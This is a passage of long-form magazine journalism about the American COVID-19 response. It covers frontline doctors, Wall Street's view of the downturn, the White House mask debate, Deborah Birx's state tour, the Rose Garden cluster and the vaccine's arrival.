Hilton and her colleagues went to minority communities in and around Charlottesville to provide testing at churches and shopping centers. “Minorities are less likely to be tested, which means they might go back home, where they have the capability to infect their entire community,” she said. People of color are more likely to be exposed because so many are essential workers. “Only one in five African-Americans can work remotely,” she said. “Only one in six Hispanics can.”
Staffers at U.Va.’s hospital prepared their wills. Hilton realized that she would be spending long hours away from her dog, Barkley, so she bought a puppy—“a dog for my dog”—that she named Bentley. “They barely get along,” she admitted. Hilton’s neighbor, a nurse in the COVID unit, has two children, and feared exposing them. The woman began living in her basement.
One of the hardest moments at Hilton’s hospital came when Lorna Breen, a forty-nine-year-old doctor, was admitted to the psych unit. Her father, Philip Breen, is a retired trauma surgeon; her mother, Rosemary Breen, had been a nurse on the ward where Lorna was admitted. Lorna had been living in Manhattan, overseeing the E.R. at NewYork-Presbyterian Allen Hospital.

When COVID inundated New York, she worked twelve-hour shifts that often blurred into eighteen. She barely slept. Within a week, Breen caught COVID herself. She sweated it out in her apartment while managing her department remotely. After her fever broke, she returned to work, on April 1st.
Breen was defined by her vitality. She was a salsa dancer and a cellist in an amateur orchestra. She ran marathons; she drove a Porsche convertible; in her spare time, she was pursuing an M.B.A. “She never left the party,” her sister, Jennifer Feist, told me.
Breen told Feist that a trauma nurse was walking through the E.R. triaging patients based on how blue their faces were. So many doctors in New York fell ill that, at one point, Breen supervised the E.R.s in two hospitals simultaneously. It became too much. As her father put it later, Breen was “like a horse that had pulled too heavy a load and couldn’t go a step further and just went down.”
Breen called her sister one morning and said that she couldn’t get out of a chair. “She was catatonic,” Feist told me. “COVID broke her brain.”
Feist and her husband, Corey, decided that Breen needed to come home to Virginia. A friend in Connecticut drove Lorna to Philadelphia; another friend took her to Baltimore. Feist was waiting on the side of the road to drive her to Charlottesville.
During the eleven days that Breen spent in U.Va.’s hospital, she was terrified that her career was over. Licensing boards, she knew, might flag evidence of mental illness. Before COVID, Breen had never had a trace of instability. Feist and her husband, both attorneys, assured her that she wouldn’t lose her license. Breen seemed to improve: she even tried to do her M.B.A. homework on her phone. Feist took Breen home with her on the last Saturday in April. The next day, Breen killed herself.
The pandemic has added immeasurable stress to a public-health workforce already suffering from burnout. Feist told me, “She got crushed because she was trying to help other people. She got crushed by a nation that was not ready for this. We should have been prepared for this. We should have had some sort of plan.”
13. The Mission of Wall Street
[Goldman Sachs]( is a controversial name in high finance. Its influence pervades American economic policy. Three of the twelve presidents of the Federal Reserve have worked there. Steven Mnuchin, the Treasury Secretary, is a Goldman alum. The company’s many critics see it as the pinnacle of avarice. They hold it responsible for contributing to the vast income disparities in America and see its alumni as manipulating government policy to further enrich the wealthy. But, in the upper chambers of power, Goldman’s culture of success is revered.
In the first quarter of 2020, the Goldman view of the economy was exuberant. Jan Hatzius, its chief economist, told me, “We had come fully out of the deep downturn post-2008.” Unemployment was near historically low levels; wages were creeping up. Sure, median incomes hadn’t risen substantially since the seventies; the gap between the rich and the poor appeared unbridgeable. But those weren’t Goldman problems. The company exists to make wealthy clients wealthier.
When the Wuhan outbreak began, the economic risk to America seemed low. Previous pandemics, such as H1N1 and SARS, had negligible economic impact on the U.S. On February 12th, with COVID already rooted in this country, the Dow Jones closed at 29,551—a record high at the time. Three weeks later, Hatzius said, “we began the deepest contraction in the global economy on record.”
Hatzius compiled data for quarterly Goldman G.D.P. forecasts. Normally, he said, “you estimate the ups and downs of a business cycle by, say, relating people’s propensity to spend on consumer goods to their labor income or tax changes, or the effect of interest-rate changes on the willingness or ability to buy homes.” This situation was different. “It wasn’t the case that people didn’t have the money to go to restaurants—they couldn’t go to restaurants.” Airlines stopped flying. Car production ceased. Entire sectors had to be subtracted from the economy: “It was more arithmetic than econometrics.”
On March 27th, the Times ran an apocalyptic headline: “job losses soar; u.s. virus cases top world.” Curiously, by that time, the Dow had reversed its plunge and begun a long climb that was strikingly at odds with the actual economy. In November, it once again reached record highs.
Steve Strongin is a senior adviser at Goldman. Sixty-two, he wears rimless glasses that lend him the aspect of a nineteenth-century European intellectual: Ibsen without the sideburns. “Markets very often get talked about as though they’re some kind of giant casino,” he told me. “But they actually have a deep economic function, which is to move capital, both equity and debt, from businesses that no longer serve a purpose to businesses we need today.”
The market’s initial reaction, Strongin said, was “Somehow we are going to freeze in place, the virus will pass, and then we’ll unfreeze.” During that phase, Wall Street’s function was to provide liquidity as clients turned to preservation strategies—raising cash, drawing on lines of credit—while waiting out the contagion. But the pandemic settled in like a dinner guest who wouldn’t leave and was eating everything in the pantry.
“The moment when everybody was forced to reassess the severity and longevity of the crisis is when people realized that asymptomatic carriers were important,” Strongin said. “That meant that all the prior controls were going to fail.” Thousands of businesses would close. Nobody alive had seen a catastrophe of such scale. The rules had to change. The pandemic was a historic disrupter, forcing a shift from short-term to long-term thinking. Strongin, who once wrote [a paper]( called “The Survivor’s Guide to Disruption,” said, “Once that realization came into place, you saw the rush to opportunity.”
Investors pivoted to a consolidation phase: going with the winners. The market recovery was led by five stocks—[Facebook]( [Apple]( [Microsoft]( [Google]( and [Amazon]( for more than twenty per cent of the S. & P. However, “the Darwinian reality of capitalism is not about this brilliant insight into the five winners,” Strongin said. “It’s about taking money away from the fifty thousand losers. It’s the core of the economic system—we don’t prop up failures.”
The most useful thing the government can do, he said, is help people start new small businesses: “The current split between the stock market and the employment numbers is a flashing warning that the economy and the people are not the same. If we don’t spend real money, the pain will be very real, and the political consequences dangerous at best.”
14. The Man without a Mask
The third and final chance to contain the infection—masks—was the easiest, the cheapest, and perhaps the most effective. But the Administration, and the country, failed to meet the challenge.
On March 4th, as Matt Pottinger was driving to the White House, he was on the phone with a doctor in China. Taking notes on the back of an envelope while navigating traffic, he was hearing valuable new information about how the virus was being contained in China. The doctor mentioned the antiviral drug remdesivir—which was just emerging as a possible therapy in the U.S.—and emphasized that masks were extremely effective with COVID, more so than with influenza. “It’s great to carry around your own hand sanitizer,” the doctor said. “But masks are going to win the day.”
Still on the phone when he parked his stick-shift Audi, on West Executive Avenue, next to the West Wing, Pottinger forgot to put on the parking brake. As he rushed toward his office, the car rolled backward, narrowly missing the Vice-President’s limo, before coming to rest against a tree.
While the Secret Service examined the errant Audi, Pottinger kept thinking about masks. America’s pandemic response had already been handicapped by China’s withholding of information about human-to-human and asymptomatic transmission. The testing imbroglio would set the country back for months. But masks offered a ready solution.
Deborah Birx had told Pottinger that, whereas mask wearing is part of Asian culture, Americans couldn’t be counted on to comply. Pottinger began to see America’s public-health establishment as an impediment. The Surgeon General, Jerome Adams, had tweeted, “STOP BUYING MASKS! They are NOT effective in preventing general public from catching  Such messages were partly aimed at preventing the hoarding of hospital-grade masks, but they dissuaded people from adopting all forms of face covering. In those early days, the U.S. medical establishment looked at SARS-CoV-2 and flatly applied the algorithm for sars: sick people should wear masks, but for others they weren’t necessary. Redfield, of the C.D.C., told me, “We didn’t understand until mid-March that many people with COVID weren’t symptomatic but were highly infectious.”
Pottinger, however, thought it was evident that, wherever a large majority of people wore masks, contagion was stopped “dead in its tracks.” Hong Kong was one of the world’s densest cities, but there was no community spread of the virus there, because nearly everyone wore masks. Taiwan, which was manufacturing ten million masks per day for a population of twenty-three million, was almost untouched. Both places neighbored China, the epicenter. Pottinger’s views stirred up surprisingly rigid responses from the public-health contingent. In Pottinger’s opinion, when Redfield, Fauci, Birx, and Hahn spoke, it could sound like groupthink, echoing the way that their public messaging was strictly coördinated.
Nobody in the White House wore a mask until Pottinger donned one, in mid-March. Entering the West Wing, he felt as if he were wearing a clown nose. People gawked. Trump asked if he was ill. Pottinger replied, “I just don’t want to be a footnote in history—the guy who knocked off a President with COVID.”
Many N.S.C. staffers work in the Situation Room, monitoring news and global developments. They are crammed together like workers in a call center. Pottinger asked the staff virologist to teach everyone how to mask up. Some people were annoyed. Masks had become a political litmus test, with many conservatives condemning mask mandates as infringements on liberty, and to wear one in Trump’s White House seemed borderline treasonous. Pottinger was shocked to learn that, in any case, the White House had no ready supply of masks.
He called an official in Taiwan and asked for guidance about controlling the virus. Masks, he was told again. Soon after that call, Taiwan’s President donated half a million masks to the U.S., via diplomatic pouch. Pottinger took thirty-six hundred, for the N.S.C. staff and the White House medical unit, and sent the rest to the national stockpile.
In early April, new studies showed substantial reductions in transmission when masks were worn. Pottinger put copies of the studies into binders for key task-force members. A [Chinese study]( reported on an infected traveller who took two long bus rides. He began coughing on the first ride, then bought a face mask before boarding a minibus. Five passengers on the first ride were infected, and no one on the second. Another study failed to detect any viral particles in aerosol or droplets from subjects wearing surgical masks.
On April 3rd, the C.D.C. finally proclaimed that masks were vital weapons. It was the last opportunity to do something meaningful to curb the pandemic.
The C.D.C.’s sudden reversal, Redfield admitted to me, was awkward: “When you have to change the message, the second message doesn’t always stick.” Worse, when the President announced the new mask advisory, he stressed, “This is voluntary,” adding, “I don’t think I’m going to be doing it.”
Trump is a notorious germophobe. He hates shaking hands and recoils when anyone near him sneezes. He once chastised Mick Mulvaney, on camera in the Oval Office, “If you’re going to cough, please leave the room.” Years before COVID, Trump told Howard Stern that he had a hand-washing obsession, which “could be a psychological problem.” It’s one of the only frailties he acknowledges. He seems fascinated by his horror of contamination.
How could such a man refuse to wear a mask in a pandemic? It wasn’t just Trump, of course; the people around him followed his example. Pence visited the Mayo Clinic without a mask, violating hospital policy. Many Republican legislators shunned masks even after members of their caucus became infected. It wasn’t just Republicans, but Democrats were twice as likely to say that masks should always be worn. It wasn’t just men, but women were more in favor of masks. It wasn’t just white people, but they were much more averse to mask wearing than Blacks and Latinos were. If you name each of the groups least likely to wear a mask, the result roughly correlates with the average Trump voter.
Some anti-maskers called the coronavirus a hoax; others believed that it wasn’t all that dangerous. But the image of the maskless President spoke to people, especially his base. He appeared defiant, masculine, invulnerable. He knew that the virus was dangerous—“more deadly than even your strenuous flus,” as he [told Bob Woodward]( in a February interview that surfaced months later. Yet he dared the virus to touch him, like Lear raging against the storm.
Tens of millions of Americans emulated the President’s bravado, and the unchecked virus prolonged unemployment, upended efforts to reopen the economy, and caused many more fatalities. “I’m not buying a fucking mask,” Richard Rose, a thirty-seven-year-old Army veteran from Ohio, posted on Facebook. “I’ve made it this far by not buying into that damn hype.” He tested positive on July 1st and died three days later. There are many similar stories.
It’s dispiriting to think that, had such a simple precaution been broadly implemented from the start, America could have avoided so much suffering, death, impoverishment, and grief. The starkest example occurred in Kansas, when the governor issued an executive order to wear masks in public but allowed counties to opt out. It was as if Kansas were performing a clinical trial on itself. Within two months, infections in mask-wearing counties had fallen by six per cent; elsewhere, infections rose a hundred per cent.
Of course, wearing a mask was a much smaller burden than self-isolating. Although CNN repeatedly ran alarming footage of people who refused to stop going to bars or malls, a far greater number of Americans had listened to the experts, sequestering themselves for months, at tremendous financial and emotional cost. My wife and I live in Austin, and, as the quarantine dragged on, we forced ourselves to take an occasional drive, partly to keep our car battery alive. We’d snake through vacant streets downtown, grimly taking note of which businesses had boarded up since the previous drive.
One April afternoon, I went for a jog on a school track near my home. A group of young women were running time trials in the hundred-metre dash. They were the fastest people I had ever seen. Occasionally, as I came around a curve, I’d pull even with one of the women just as she was taking off. It was like Wile E. Coyote eating the Road Runner’s dust.
“What school do you guys run for?” I asked one of them, who was cooling off.
“Oh, it’s not a school,” she said. “We’re Olympians.”
Instead of competing in Tokyo, here they were, on a middle-school track in Austin, isolating together and trying to maintain peak condition as they waited for the rescheduled Games. So many dreams have been deferred or abandoned.
15. “I Can’t Breathe”
The corpse on the autopsy bench was a middle-aged Black man with COVID-19. Six feet four and two hundred and twenty-three pounds, he had suffered from many of the co-morbidities that Ebony Hilton had described to me. The medical examiner identified signs of heart disease and hypertension. The autopsy noted the presence of fentanyl and methamphetamine, which could be considered co-morbidities, although they didn’t really factor into this case. The cause of death was a police officer’s knee on the neck. The victim was [George Floyd](
On a video seen worldwide, four Minneapolis policemen killed Floyd as he was handcuffed and lying face down in the street. It was Memorial Day. One cop stood watch as two knelt on Floyd’s back and held his legs while the fourth, Derek Michael Chauvin, pressed his knee into Floyd’s neck for more than nine minutes.
At a time when health officials were begging people to stay home and avoid groups, [protests arose in Minneapolis]( then spread across America. They called to mind the Liberty Loans parades in 1918—the ones that had served as potent vectors for the killer flu. Nevertheless, thirteen hundred public-health officials signed a letter supporting the demonstrations.
Hilton joined a protest in Charlottesville on June 7th. Hundreds of people marched to the rotunda at the University of Virginia, carrying [Black Lives Matter]( signs and placards saying “Let My People Breathe.” I asked Hilton if she was worried about the mass gatherings. She said that she expected a rise in infections. Then she added, “For Black men, one in every thousand is at risk of dying in his lifetime from an encounter with a police officer. If you think about that number, that’s what leads Black people to say it’s worth me dying and going out to this protest and saying enough is enough. Police brutality is almost like a pandemic, a generational pandemic. It’s a feeling—I’m going to die anyway, so I might as well risk this virus that I can’t see, to speak about the virus of systemic racism that I can see.”
Surprisingly, the marches did not appear to be significant drivers of transmission. “We tested thousands of people,” Michael Osterholm, the director of the Center for Infectious Disease Research and Policy, at the University of Minnesota, said. “We saw no appreciable impact.” One study found lower rates of infection among marchers than in their surrounding communities. Epidemiologists concluded that mask wearing and being outdoors protected the protesters. Moreover, demonstrators were on the move. Osterholm said that people in stationary crowds are more likely to become infected. In other words, joining a protest march is inherently less dangerous than attending a political rally.
16. Thelma and Louise
The President hadn’t gathered with supporters since March, and was eager to dive back into the pool of adulation. An event was scheduled for June 20th. “It’s going to be a hell of a night,” he promised. He tweeted, “Almost One Million people request tickets for the Saturday Night Rally in Tulsa, Oklahoma!”
Only sixty-two hundred showed up. Trump was enraged by the dismal turnout but delivered his usual blustery speech. Because Oklahoma had just seen a record increase in COVID cases, attendees were required to release the Trump campaign from responsibility for any exposure. Just before Trump went onstage, two Secret Service officers and six campaign staffers tested positive.
In the audience was [Herman Cain]( the former C.E.O. of Godfather’s Pizza and an erstwhile Presidential candidate, who had become one of Trump’s most prominent Black supporters. Like nearly everyone else, he was unmasked. He flew home to Atlanta the next day, feeling exhausted—“from his travels,” his daughter, Melanie Cain Gallo, believed. It was Father’s Day, and she stopped by to give him a gift. They embraced. She had seen a photograph of him at the rally and wondered why he hadn’t worn a mask. Cain had preached the virtue of social distancing and hand washing on “The Herman Cain Show,” a Web series that he hosted, and he had usually worn a mask in public. He told her that everyone entering the Tulsa auditorium had passed a fever check—an insufficient gauge.
Gallo worked with her dad all week on his show. By Friday, they were both feeling ill, but Cain filmed another episode. Flanked by the American flag and a painting of Ronald Reagan, he looked wan, his eyes rheumy. He quoted a newspaper headline: “U.S. DEATH RATE FALLS FOR THIRD DAY IN A ROW.” Other newscasts had hyped rising case counts, he complained, adding, “They never get to the death rate is falling.”
On Monday, both were sick enough to go to a clinic for a test. Cain was feeling weak, so he waited by the car while Gallo stood in a long line. Suddenly, he passed out. An E.M.S. truck took him to the E.R. “They checked him out and said he was fine,” Gallo recalled. They returned to the testing clinic. Both were positive.
Her case was mild. On July 1st, Cain was hospitalized. That day, he tweeted an article about a forthcoming Trump rally at Mt. Rushmore. “Masks will not be mandatory,” Cain tweeted, adding approvingly, “PEOPLE ARE FED UP!” It was a defiant nod to Trump’s base. Cain died on July 30th. He was seventy-four.
For some public-health officials, Deborah Birx had become an object of scorn. “She’s been a disaster,” a former head of the C.D.C. told me. The Yale epidemiologist Gregg Gonsalves tweeted, “Dr. Birx, what the hell are you doing? What happened to you? Your HIV colleagues are ashamed.” Birx was accused of enabling an incompetent and mendacious President. The mortified look on her face at the press briefing when he suggested injecting disinfectant or using powerful light—“inside the body, which you can do either through the skin or in some other way”—became a meme, underscoring how much Trump had compromised scientists. The public didn’t know what she was saying in private.
Birx confided to colleagues that she’d lost confidence in the C.D.C. She disparaged the agency’s hospital reports on COVID, which relied on models, not hard data. A C.D.C. staffer told Science that compiling precise totals daily in a pandemic was impossible. But hospitals quickly complied after Birx said that supplies of remdesivir could be portioned out only to hospitals that provided inpatient COVID data.
In August, Dr. Scott Atlas, a neuroradiologist, a fellow at Stanford University’s Hoover Institution, and a Fox News regular, joined the task force. He was adamant that children should return to school—as was the American Academy of Pediatrics, which urged a “safe return” to schools in the fall, warning of learning deficits, physical or sexual abuse at home, and depression. That was a debate worth having, but most of Atlas’s views on COVID seemed reckless. He insisted that masks did little to stop the spread, and he advocated creating “herd immunity” by allowing the virus to be passed freely among people at lower risk. Herd immunity is gained when roughly seventy per cent of a population has effective antibodies to the disease, through either infection or vaccination.
Once Atlas got to the White House, Trump stopped speaking to other health advisers. Herd immunity could be achieved by doing nothing at all, which became the President’s unspoken policy. Atlas encouraged Trump and others to believe that the pandemic was waning. “His voice is really very welcome combatting some of the nonsense that comes out of Fauci,” Stephen Moore, a White House economic adviser, reportedly said. (The White House denies that “the President, the White House, or anyone in the Administration has pursued or advocated for a strategy of achieving herd immunity.”)
Birx and Atlas had it out in the Oval Office, in front of Trump. Birx accused Atlas of costing American lives with his unfounded theories. Atlas cursed her. Birx, who spent twenty-eight years in the Army, gave it right back. Atlas said that young, asymptomatic people shouldn’t be tested, adding, “She just wants to lock them down and not let them live their lives.” They kept shouting at each other, but Trump was undisturbed and didn’t take either side. “It’s all reality TV to him,” one of Birx’s colleagues said.
After the confrontation, Birx demanded that Pence remove Atlas, but Pence declined. The task force began to dissolve after Atlas took a seat.
When Birx was working in Africa, she and her chief epidemiologist, Irum Zaidi, had met with Presidents and village elders across the continent, learning the value of personal diplomacy. The two scientists decided to take an American road trip together. The contagion had moved from the coasts to the heartland. In June, when the virus suddenly gripped Texas, Birx and Zaidi travelled to Dallas to meet with Governor Greg Abbott. Abbott’s dithering response to the pandemic had led to attacks by Democrats—who noted that the death rate soared when he lifted restrictions too soon—and by Republicans, who called him a tyrant for imposing any restrictions at all. At a press conference, Birx urged Texans to mask up, especially young people. “If they’re interacting with their parents and grandparents, they should wear a mask,” she said. “No one wants to pass the virus to others.” She praised Abbott for closing bars, knowing that he was being pressured to fully open the economy. Abbott soon issued a mask mandate.
Zaidi grew up in Atlanta, and her father was a C.D.C. statistician. On vacations, they took long car trips, a passion passed along to Zaidi. She loves to drive—fast. As they were leaving Dallas, a state trooper pulled her over. She’d been doing a hundred and ten.
“Little lady, what’s the hurry?” he asked.
Zaidi explained that they’d just met Governor Abbott, and New Mexico’s governor was next. “Surely you recognize Dr. Birx,” she said.
The trooper let them off.
Soon after their visit to New Mexico, Governor Michelle Lujan Grisham announced a hundred-dollar fine for going maskless in public. Birx and Zaidi proceeded to Arizona and met with Governor Doug Ducey. Birx explained that even a small increase in the percentage of positivity—going from 3.5 to five per cent—could spark an unmanageable crisis. Ducey soon declared, “If you want to participate in any good or service in Arizona, you’re going to wear a mask.”
Birx and Zaidi racked up twenty-five thousand miles as they crossed the country eight times, visiting forty-three states, many more than once. They saw the rural areas and the cities, red America and blue America. They drove past cotton farms and soybean fields, but they also saw derelict oil rigs and abandoned factories, remnants of a vanishing industrial age. There were gleaming cities, bold and glassy, with construction cranes crowning the skyline, and broken towns, tumbling in decay, with all the promise bled out of them.
The women, who got regular COVID tests, established their own protocols. They cleaned rental cars and motel rooms with Clorox Wipes. In the morning, early, they’d pick up coffee and pastries at Starbucks. Lunch was often peanut butter spread on bread with a plastic knife. Dinner was served at a drive-through window. Baristas and gas-station attendants were useful informants of community outbreaks and served as indicators of local mask compliance. Birx and Zaidi met mayors and community organizers; they visited hospitals and nursing homes; they turned H.I.V. activists into COVID activists. In Atlanta, they urged officials to test migrants working on chicken farms. They visited more than thirty universities. Those which conducted mandatory weekly testing of students had positivity rates below one per cent; at schools where only symptomatic people were tested, positivity rates were twelve to fifteen per cent. Republican and Democratic governors made the same complaint: many people wouldn’t listen as long as Trump refused to set an example.
One of the most effective governors Birx and Zaidi encountered was Jim Justice, of West Virginia. He issued a mask mandate, and in press briefings he read out the names of West Virginians who had died of COVID. He urged residents to “be great, loving neighbors.” The state developed a plan to safely reopen schools by constantly assessing the level of risk in every county and presenting these data on a color-coded map. “It’s something that every county and every state can do,” Birx said. “West Virginia represents exactly what we want to see across the country—a commonsense approach based on the data.”
A pandemic lays bare a society’s frailties. Birx and Zaidi saw a nation that was suffering from ill health even before COVID attacked, where forty per cent of adults are obese, nearly half have cardiovascular disease, and one in thirteen has asthma. They visited reservations and met with Native Americans, who have been particularly ravaged by COVID. The Salt River Pima-Maricopa Indian Community, in Arizona, gave Birx a mask inscribed with the Salt River tribe’s shield. When North Dakota recorded the nation’s highest rate of infection, Birx met with the governor, Doug Burgum, and with local, state, and tribal officials. Birx scolded them: “This is the least use of masks that we have seen in retail establishments of any place we have been.” She added, “It starts with the community, and the community deciding that it’s important for their children to be in school, the community deciding that it’s important not to infect the nursing-home staff who are caring for their residents.” Burgum eventually agreed to a mask mandate. In South Dakota, Governor Kristi Noem couldn’t find the time to meet with Birx.
For nearly six months, Birx corralled politicians, hospital executives, and public-health officials, often bringing such leaders together for the first time. She took charts and slides from state to state, promoting a simple, consistent message about masks, social distancing, transparency, and responsible leadership. She was the only federal official doing so.
One day in October, Birx and Zaidi were eating lunch at a roadside stop in Utah, beside the Bonneville Salt Flats, where land speed records are often set. The salt stretched out like a frozen sea.
They’d rented a blue Jeep Wrangler. “We have to go off-road, for just a minute,” Zaidi said. Birx gazed at the great white emptiness. “As long as you don’t hit anybody,” she said.
17. Dark Shadows
I asked Dr. Fauci about the global-preparedness study calling America the nation best prepared for a pandemic. What happened? He emitted a despairing laugh and said, “We never got back to baseline”—the point when the contagion had been reduced enough to allow contact tracing to minimize spread. “It could be the fact that we didn’t have a uniform strategy,” he went on. “It could be our own culture right now, of people not wanting to be told what to do. The guidelines say ‘Don’t go to bars. Wear a mask.’ And you look at the pictures in the newspaper and on TV and you see large crowds of mostly young people, not wearing masks.”
Fauci, who has led niaid through six Administrations, has never seen this level of distrust and anger in the country. “Political divisiveness doesn’t lend itself to having a coördinated, coöperative, collaborative response against a common enemy,” he said. “There is also this pushback in society against anything authoritative, and scientists are perceived as being authority, so that’s the reason I believe we have an anti-science trend, which leads to an anti-vaccine trend.” Even with an effective vaccine—or several of them—social resistance could delay the longed-for herd immunity.
I asked Fauci if he’d been threatened. “Oh, my goodness,” he said. “Harassing my wife and my children. It’s really despicable. It’s this dark-Web group of people who are ultra-ultra-ultra-far-right crazies. They somehow got the phone numbers of my children, they’ve tracked them where they work, they’ve harassed them with texts, some threatening, some obscene. We have gotten multiple death threats, my wife and I.” He sighed and said, “It is what it is.”
“Buy ammunition, ladies and gentlemen, because it’s going to be hard to get,” Michael Caputo warned, in a rambling Facebook Live event on September 13th. Caputo is an Assistant Secretary of Health and Human Services, and focusses on public affairs. He controls the flow of information from America’s public-health establishment: the C.D.C., the F.D.A., and the N.I.H. Trump appointed Caputo to the post in April, when COVID was out of control; competence and transparency were needed to restore public trust. Caputo had no public-health expertise, and he claimed that his best friend was the notorious political operative [Roger Stone](
Evidently, all the President wanted Caputo to do was reinforce his message that the virus wasn’t as dangerous as scientists claimed, and that the crisis was under control. Caputo presided over interventions by H.H.S. that meddled with the C.D.C.’s guidelines—apparently, to get case numbers down and stanch the flow of bad news. Trump asked Caputo to lead a campaign to “defeat despair,” which encouraged celebrities to endorse the Administration’s laissez-faire approach. To fund the campaign, Caputo snatched three hundred million dollars from the C.D.C.’s budget.
Meanwhile, his science adviser, Paul Alexander, a part-time professor at a Canadian university, pushed an alternative plan: herd immunity. “It only comes about allowing the non-high risk groups to expose themselves to the virus,” Alexander wrote to Caputo, in an e-mail [obtained by Politico]( “We want them infected.”
Caputo’s efforts met with resistance from Fauci and others, and he felt under siege. In the Facebook video, he was unshaven, sitting outside his house in Buffalo. “There are scientists working for this government who do not want America to get better,” he said. “It must be all bad news from now until the election.” He stared into space. “This is war. Joe Biden is not going to concede. The [Antifa]( attacks, the murders that have happened, the rallies that have turned into violence—this is all practice.”
Such embattled thoughts were shared by Adam Fox. A powerfully built man with a trim brown beard and a square face, he helped lead a militia called the Michigan Three Percenters—a reference to their belief that only three per cent of American colonists took up arms against Britain in the Revolutionary War.
In a strip mall in Grand Rapids, a shop called the Vac Shack sells and services vacuum cleaners. Fox, a former employee, had been kicked out of his girlfriend’s house and was homeless. The shop’s owner let Fox sleep in the basement. That’s where he allegedly began plotting to kidnap Gretchen Whitmer, Michigan’s governor, who had [enforced tough lockdown measures](
In June, at a gun-rights rally in Lansing, Fox met with members of a militia, the Wolverine Watchmen, who planned to kill police officers. They were infuriated by Whitmer’s COVID restrictions, but, even before the pandemic, they’d been prone to anger. “I’m sick of being robbed and enslaved by the state,” one of the conspirators complained, after receiving a ticket for driving without a license.
Fox allegedly told the Watchmen that he was recruiting for an operation targeting the state capitol. He needed two hundred men to storm the building and abduct politicians, including Whitmer, whom Fox called a “tyrant bitch.” Although the plotters were mostly unemployed or in low-paying jobs, they spent thousands of dollars on a Taser and night-vision goggles, and were planning to spend thousands more on explosives. They were plainly inspired by Trump’s disparaging of Whitmer for shutting down her state. “liberate michigan!” the President had once tweeted.
The F.B.I. learned of the scheme, and arrested the conspirators in October. In a statement, Whitmer singled out Trump, who, in a recent debate with Biden, had refused to explicitly condemn right-wing, white-supremacist violence. “Words matter,” she said. “When our leaders meet with and encourage domestic terrorists, they legitimize their actions and they are complicit.”
Trump tweeted that “My Justice Department and Federal Law Enforcement” had foiled the plot, adding, “Rather than say thank you, she calls me a White Supremacist.” He commanded Whitmer, “Open up your state.”
On Michael Caputo’s Facebook video, he sighed deeply. “I don’t like being alone in Washington,” he said. “The shadows on the ceiling in my apartment, there alone, those shadows are so long.”
Soon afterward, he went on medical leave.

18. The Rose Garden Cluster
On September 26th, eight days after the death of Supreme Court Justice [Ruth Bader Ginsburg]( Trump nominated her successor, [Amy Coney Barrett]( in a White House ceremony. The Reverend John Jenkins, the president of the University of Notre Dame, where Barrett had taught law, recalled, “We were required to wear a mask at entry and, after going through security, were immediately taken to a room and administered a nasal swab for a COVID test.” Once a negative result came back, guests could remove their masks. “I assumed that we could trust the White House health protocols,” Jenkins said. He regretted his decision: “I unwittingly allowed myself to be swept up very publicly into the image of a White House that sometimes seemed to disregard scientific evidence and minimize the threat of the pandemic.”
Guests were ushered to the Rose Garden, where there were two hundred assigned seats. Barrett spoke briefly. “Movement conservatives were very happy,” Mike Lee, the Republican senator from Utah, recalled. Friends who hadn’t seen one another for months reunited, he said, which “added to the jovial atmosphere.” Afterward, dozens gathered in the Diplomatic Reception Room to meet the Barrett family.
That day, seven hundred and sixty-nine American deaths from COVID were recorded—down from [the spring peak]( on April 15th, of twenty-seven hundred and fifty-two. Despite the absence of miracle drugs, the death rate for hospitalized patients had fallen significantly. In part, this was because the average age of patients was lower, but the improved chances of survival were also the result of flattening the curve, which gave doctors and scientists the time to devise more effective treatments, such as proning. The infection rate, however, was harder to slow. The number of cases per day, which had topped seventy-five thousand in mid-July, had faded a bit in the late summer, but it was again rounding upward. After months of being more careful, Americans had apparently let down their guard.
The White House refused to say when the President had last been tested before the Rose Garden event. He had just made multiple campaign stops, in Florida, Georgia, and Virginia. More than a dozen guests—including Reverend Jenkins, Senator Lee, the former New Jersey governor [Chris Christie]( and the former Presidential adviser [Kellyanne Conway]( tested positive. Without knowing Trump’s testing history, no one can say when he contracted the disease or how many people he might have infected. The full extent of the Rose Garden cluster will never be known. Fauci labelled it a superspreader event.
Despite his germophobia, Trump is proud of his immune system, boasting on multiple occasions that he never gets the flu. But COVID hit him hard. [According to New York]( he told a confidant, “I could be one of the diers.” A friend from the real-estate world, Stanley Chera, had died from it. “He went to the hospital, he calls me up,” Trump recounted after Chera’s death. “He goes, ‘I tested positive.’ I said, ‘Well, what are you going to do?’ He said, ‘I’m going to the hospital. I’ll call you tomorrow.’ He didn’t call.” Vanity Fair [reported]( that Trump developed heart palpitations. He asked aides, “Am I going out like Stan Chera?”
Hospitals are often portals to the graveyard, and that has been especially true during the pandemic. But Trump, who received a series of cutting-edge therapies, including monoclonal antibodies, was ready to return to the White House after three days. [According to the Times]( he considered hobbling out of the hospital and then yanking open his shirt to reveal a Superman logo. In the event, he saved his drama for the moment he stood again on the Truman Balcony and ripped off his surgical mask.
“Don’t be afraid of COVID,” he tweeted afterward. “Don’t let it dominate your life.”
19. Survivors
After Amy Klobuchar dropped out of the Presidential race, she was on Biden’s shortlist for his running mate. George Floyd’s death put an end to that. She had begun her career twenty years earlier as the district attorney in Minneapolis, earning a reputation for being tough on crime but light on police misconduct. On June 18th, she asked Biden to take her name off his list and urged him to select a woman of color as his running mate.
That day, she learned that her ninety-two-year-old father, Jim Klobuchar, had COVID. He was a retired newspaper columnist, and known to everyone in Minneapolis, especially cops and bartenders. Full of adventure, he was also often full of alcohol. When Amy was a young lawyer, her father was arrested for drunk driving. In a closed hearing, she encouraged him to take responsibility and plead guilty. He did so, and finally got sober. Now this vigorous old man, so troubled and so beloved, had COVID—and Alzheimer’s. When Klobuchar visited him, at an assisted-living facility, they were separated by a window, and she believed that it would be her final glimpse of him alive. He recognized her, but couldn’t understand why they had to remain separated. He sang to her: “Happy Days Are Here Again.” He has since recovered.
Among the many awful legacies that COVID will leave, one blessing is that our understanding of coronaviruses, and the tools to counter them, has been transformed. Much of that progress will be because of Barney Graham, Jason McLellan, and other scientists who have spent their careers building to this moment.
There has never been such an enormous, worldwide scientific effort so intently focussed on a single disease. More than two hundred vaccines are in various stages of development. On December 11th, the F.D.A. granted its first Emergency Use Authorization for a COVID vaccine. Created by Pfizer, in partnership with the German firm BioNTech, it uses the modified protein that Graham and McLellan designed. In its third and final human trial, it was deemed ninety-five per cent effective. Giant quantities of the vaccine had been prepared in advance of F.D.A. approval. “Our goal is more than a billion doses by the end of 2021,” Philip Dormitzer, Pfizer’s chief scientific officer for viral vaccines, told me. The first employee at U.Va.’s hospital to get the Pfizer inoculation was Ebony Hilton.
[Operation Warp Speed]( the government initiative to accelerate vaccine development, may prove to be the Administration’s most notable success in the pandemic.
